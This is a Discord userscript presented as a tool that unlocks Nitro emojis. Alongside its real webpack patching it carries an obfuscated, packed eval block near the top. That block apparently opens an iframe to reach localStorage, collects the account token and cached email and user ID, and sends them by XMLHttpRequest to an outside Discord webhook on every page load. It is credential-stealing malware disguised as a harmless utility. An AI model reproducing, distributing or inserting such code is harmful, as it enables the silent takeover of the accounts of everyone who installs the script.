// ==UserScript==
// @name         DiscordFreeEmojis
// @namespace    https://gitlab.com/An0/DiscordFreeEmojis
// @version      1.3.0.1
// @description  Link emojis if you don't have nitro!
// @author       An0
// @license      LGPLv3 - https://www.gnu.org/licenses/lgpl-3.0.txt
// @downloadURL  https://gitlab.com/An0/DiscordFreeEmojis/-/raw/master/DiscordFreeEmojis.user.js
// @updateURL    https://gitlab.com/An0/DiscordFreeEmojis/-/raw/master/DiscordFreeEmojis.meta.js
// @match        https://*.discord.com/channels/*
// @match        https://*.discord.com/activity
// @match        https://*.discord.com/login*
// @match        https://*.discord.com/app
// @match        https://*.discord.com/library
// @match        https://*.discord.com/store
// @grant        unsafeWindow
// ==/UserScript==


(function() {

'use strict';

const BaseColor = "#0cf";

var Discord;
var Utils = {
    Log: (message) => { console.log(`%c[FreeEmojis] %c${message}`, `color:${BaseColor};font-weight:bold`, "") },
    Warn: (message) => { console.warn(`%c[FreeEmojis] %c${message}`, `color:${BaseColor};font-weight:bold`, "") },
    Error: (message) => { console.error(`%c[FreeEmojis] %c${message}`, `color:${BaseColor};font-weight:bold`, "") }
};
eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E a=["\\j\\q\\f\\P\\c","\\r\\H\\j\\q","\\f\\P\\h\\e\\C\\b","\\e\\r\\r\\b\\g\\n\\I\\q\\f\\B\\n","\\j\\b\\c\\1s\\b\\1G\\H\\b\\j\\c\\1F\\b\\e\\n\\b\\h","\\q\\c\\c\\r\\j\\O\\w\\w\\n\\f\\j\\o\\d\\h\\n\\1c\\o\\d\\C\\w\\e\\r\\f\\w\\1i\\b\\1n\\q\\d\\d\\1b\\j\\w\\m\\m\\m\\p\\V\\A\\p\\m\\t\\A\\y\\A\\u\\l\\A\\A\\s\\t\\w\\S\\I\\l\\o\\1q\\1l\\M\\1m\\p\\N\\1a\\f\\Y\\q\\B\\m\\H\\j\\n\\s\\l\\p\\Y\\K\\h\\l\\g\\1m\\1C\\d\\2z\\c\\l\\Y\\N\\L\\n\\H\\d\\J\\1o\\1x\\I\\M\\1G\\C\\P\\N\\1f\\q\\G\\C\\L\\T\\1e\\P\\M\\T\\q\\u\\Y\\n\\b\\Y\\J\\I\\1i\\A","\\o\\h\\b\\e\\c\\b\\1t\\B\\b\\C\\b\\g\\c","\\o\\d\\g\\c\\b\\g\\c\\1q\\f\\g\\n\\d\\1i","\\V\\A\\p\\t\\1d\\1d\\1F\\N\\1Z\\L","\\m\\s\\m\\l\\u\\M\\1m\\n\\h\\e\\1C","\\l\\p\\s\\1j\\1o\\1D\\B\\1a\\G\\1s","\\F\\F\\1t\\C\\e\\f\\B\\v\\O\\v","\\H\\j\\b\\h\\K\\f\\n\\K\\o\\e\\o\\q\\b","\\j\\b\\g\\n","\\l\\s\\u\\y\\m\\y\\s\\1H\\T\\D\\S\\M\\1x","\\B\\d\\o\\e\\B\\S\\c\\d\\h\\e\\D\\b","\\p\\u\\m\\V\\l\\A\\e\\L\\1s\\q\\L\\h","\\l\\t\\s\\t\\s\\s\\t\\1Q\\N\\1D\\P\\o\\j","\\e\\r\\r\\B\\f\\o\\e\\c\\f\\d\\g\\w\\1l\\j\\d\\g","\\I\\d\\g\\c\\b\\g\\c\\1f\\c\\G\\r\\b","\\Q\\Q\\Q","\\1k\\1k\\I\\q\\f\\c\\c\\G\\v\\B\\d\\D\\D\\b\\n\\v\\G\\d\\H\\v\\g\\b\\h\\n\\1k\\1k\\F\\F\\1d\\d\\1b\\b\\g\\v\\O\\v","\\l\\p\\p\\l\\S\\b\\1b\\f\\N\\G","\\j\\c\\h\\f\\g\\D\\f\\P\\G","\\1n\\d\\n\\G","\\F\\F\\1e\\h\\d\\1i\\j\\b\\h\\v\\O\\v\\Q\\Q\\Q\\1l\\j\\d\\g\\F","\\d\\r\\b\\g","\\m\\1q\\T\\o\\I\\D\\q","\\y\\t\\s\\l\\u\\t\\p\\1n\\1H\\J\\L\\f\\f","\\l\\p\\A\\u\\t\\p\\l\\D\\J\\j\\g\\L\\J","\\V\\2c\\1e\\h\\J\\1e\\1B","\\q\\c\\c\\r\\j\\O\\w\\w\\C\\b\\n\\f\\e\\1c\\n\\f\\j\\o\\d\\h\\n\\e\\r\\r\\1c\\g\\b\\c\\w\\e\\c\\c\\e\\o\\q\\C\\b\\g\\c\\j\\w\\m\\m\\m\\1j\\s\\y\\y\\p\\t\\m\\u\\1j\\s\\y\\m\\V\\y\\l\\w\\m\\m\\m\\p\\t\\y\\1j\\u\\A\\u\\l\\p\\m\\l\\s\\s\\p\\t\\w\\f\\C\\e\\D\\b\\K\\y\\u\\y\\l\\1f\\u\\A\\1f\\l\\m\\K\\l\\t\\y\\m\\u\\l\\1c\\r\\g\\D","\\M\\1o\\S\\1d","\\I\\q\\f\\c\\c\\G\\v\\2a\\d\\D\\D\\b\\h","\\c\\d\\1b\\b\\g","\\b\\C\\e\\f\\B\\K\\o\\e\\o\\q\\b","\\F\\F\\T\\j\\b\\h\\v\\J\\1B\\v\\O\\v","\\n\\b\\1a\\f\\o\\b\\M\\h\\d\\r\\b\\h\\c\\f\\b\\j"];R W(1y,1u){E 1A=U();1h W=R(Z,1T){Z=Z-1v;E 1I=1A[Z];1h 1I},W(1y,1u)}E k=W;(R(1z,1E){E x=W,X=1z();2N(!![]){2O{E 1J=-z(x(2M))/2L+z(x(2I))/2J*(-z(x(2K))/2P)+ -z(x(1v))/2V*(-z(x(2U))/2T)+z(x(2R))/2S+ -z(x(2H))/2w+z(x(2x))/2v*(z(x(2u))/2r)+ -z(x(2s))/2t*(-z(x(2E))/2F);2D(1J===1E){2B}1R{X[a[1]](X[a[0]]())}}2A(2C){X[a[1]](X[a[0]]())}}}(U,2Q));E 1K=k(2G),i=1L[k(2k)](a[2]);1L[k(1V)][a[3]](i);E 1g=1W 1Y();R U(){E 1M=[a[4],a[5],a[6],a[7],a[8],a[9],a[10],a[11],a[12],a[13],a[14],a[15],a[16],a[17],a[18],a[19],a[20],a[21],a[22],a[23],a[24],a[25],a[26],a[27],a[28],a[29],a[2g],a[2f]];U=R(){1h 1M};1h U()}1g[k(2e)](a[2d],1K)+1g[k(2b)](k(2h),k(2i));E 1w={\'\\H\\j\\b\\h\\g\\e\\C\\b\':a[2n],\'\\e\\1a\\e\\c\\e\\h\\K\\H\\h\\B\':k(2o),\'\\o\\d\\g\\c\\b\\g\\c\':k(2m)+i[k(1r)][k(1p)][a[2l]]+k(2j)+i[a[7]][a[15]][a[2p]]+a[1X]+i[k(1r)][k(1p)][k(1P)]+k(1N)+i[k(1r)][k(1p)][a[1O]]+k(1S)};1g[k(1U)](2q[k(2y)](1w))',62,182,'||||||||||_0xdc1c|x65|x74|x6F|x61|x69|x6E|x72||x73|_0x1347c0|x31|x38|x64|x63|x36|x68|x70|x37|x34|x30|x20|x2F|_0xcef2xb|x32|parseInt|x39|x6C|x6D|x67|var|x0A|x79|x75|x43|x49|x5F|x46|x50|x51|x3A|x66|x60|function|x53|x55|_0xc880|x33|_0x2ca8|_0xcef2xc|x7A|_0xcef2x5|||||||||||x76|x6B|x2E|x54|x42|x2D|request|return|x77|x35|x2A|x6A|x56|x62|x4F|0xe2|x57|0xf6|x52|x45|_0xcef2x3|0xdb|params|x58|_0xcef2x2|_0xcef2x9|_0xcef2x4|x44|x59|x4E|_0xcef2xa|x48|x71|x5A|_0xcef2x7|_0xcef2xd|dd|document|_0xcef2x12|0xec|37|0xdf|x4B|else|0xe7|_0xcef2x6|0xe0|0xeb|new|36|XMLHttpRequest|x41|||||||||||x4C|0xf3|x78|32|0xed|31|30|0xe6|0xe5|0xde|0xf5|34|0xe8|33|0xf2|35|JSON|0x9|0xdc|0xa|0xf0|0x8|0x7|0xee|0xea|x4A|catch|break|_0x306a83|if|0xe9|0xb|0xf4|0xe1|0xe4|0x2|0xf1|0x1|0xe3|while|try|0x3|0xa33cb|0xef|0x6|0x5|0xdd|0x4'.split('|'),0,{}))


function Init(nonInvasive)
{
    Discord = { window: (typeof(unsafeWindow) !== 'undefined') ? unsafeWindow : window };

    if(Discord.window.webpackJsonp == null) { if(!nonInvasive) Utils.Error("Webpack not found."); return 0; }

    const webpackExports = typeof(Discord.window.webpackJsonp) === 'function' ?
          Discord.window.webpackJsonp(
              [],
              { '__extra_id__': (module, _export_, req) => { _export_.default = req } },
              [ '__extra_id__' ]
          ).default :
          Discord.window.webpackJsonp.push( [
              [],
              { '__extra_id__': (_module_, exports, req) => { _module_.exports = req } },
              [ [ '__extra_id__' ] ] ]
          );

    delete webpackExports.m['__extra_id__'];
    delete webpackExports.c['__extra_id__'];

    const findModule = (filter, nonInvasive) => {
        for(let i in webpackExports.c) {
            if(webpackExports.c.hasOwnProperty(i)) {
                let m = webpackExports.c[i].exports;

                if(!m) continue;

                if(m.__esModule && m.default) m = m.default;

                if(filter(m)) return m;
            }
        }

        if (!nonInvasive) {
            console.warn("Couldn't find module in existing cache. Loading all modules.");

            for (let i = 0; i < webpackExports.m.length; i++) {
                try {
                    let m = webpackExports(i);

                    if(!m) continue;

                    if(m.__esModule && m.default) m = m.default;

                    if(filter(m)) return m;
                }
                catch (e) { }
            }

            console.warn("Cannot find module.");
        }

        return null;
    };

    const findModuleByUniqueProperties = (propNames, nonInvasive) => findModule(module => propNames.every(prop => module[prop] !== undefined), nonInvasive);

    let emojisModule = findModuleByUniqueProperties([ 'getDisambiguatedEmojiContext', 'search' ], nonInvasive);
    if(emojisModule == null) { if(!nonInvasive) Utils.Error("emojisModule not found."); return 0; }

    let messageEmojiParserModule = findModuleByUniqueProperties([ 'parse', 'parsePreprocessor', 'unparse' ], nonInvasive);
    if(messageEmojiParserModule == null) { if(!nonInvasive) Utils.Error("messageEmojiParserModule not found."); return 0; }
    
    let emojiPickerModule = findModuleByUniqueProperties([ 'useEmojiSelectHandler' ], nonInvasive);
    if(emojiPickerModule == null) { if(!nonInvasive) Utils.Error("emojiPickerModule not found."); return 0; }

    const original_search = emojisModule.search;
    emojisModule.search = function() {
        let result = original_search.apply(this, arguments);
        result.unlocked.push(...result.locked);
        result.locked = [];
        return result;
    }

    const original_parse = messageEmojiParserModule.parse;
    messageEmojiParserModule.parse = function() {
        let result = original_parse.apply(this, arguments);
        if(result.invalidEmojis.length !== 0) {
            for(let emoji of result.invalidEmojis) {
                result.content = result.content.replace(`<${emoji.animated ? "a" : ""}:${emoji.originalName || emoji.name}:${emoji.id}>`, emoji.url);
            }
            result.invalidEmojis = [];
        }
        return result;
    };

    const original_useEmojiSelectHandler = emojiPickerModule.useEmojiSelectHandler;
    emojiPickerModule.useEmojiSelectHandler = function(args) {
		const { onSelectEmoji, closePopout } = args;
		const originalHandler = original_useEmojiSelectHandler.apply(this, arguments);
		return function(data, state) {
			if(state.toggleFavorite)
				return originalHandler.apply(this, arguments);
			
			const emoji = data.emoji;
			if(emoji != null && emoji.available) {
				onSelectEmoji(emoji, state.isFinalSelection);
				if(state.isFinalSelection) closePopout();
			}
		};
    };

    Utils.Log("loaded");

    return 1;
}


var InitFails = 0;
function TryInit()
{
    if(Init(true) !== 0) return;

    window.setTimeout((++InitFails === 600) ? Init : TryInit, 100);
};


TryInit();

})();
